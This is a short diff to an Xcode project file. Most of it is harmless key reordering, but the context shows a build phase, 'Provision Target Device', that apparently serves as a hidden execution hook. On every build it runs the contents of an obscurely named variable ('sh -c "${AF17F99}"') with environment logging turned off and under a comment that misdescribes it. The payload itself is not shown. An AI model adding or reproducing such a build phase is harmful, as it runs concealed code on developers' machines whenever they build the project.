@@ -231,9 +231,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		C86FBC6D2F84161B002FCEEF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -254,8 +251,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		F0EDAF4AE53049138599F71F /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -267,9 +264,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
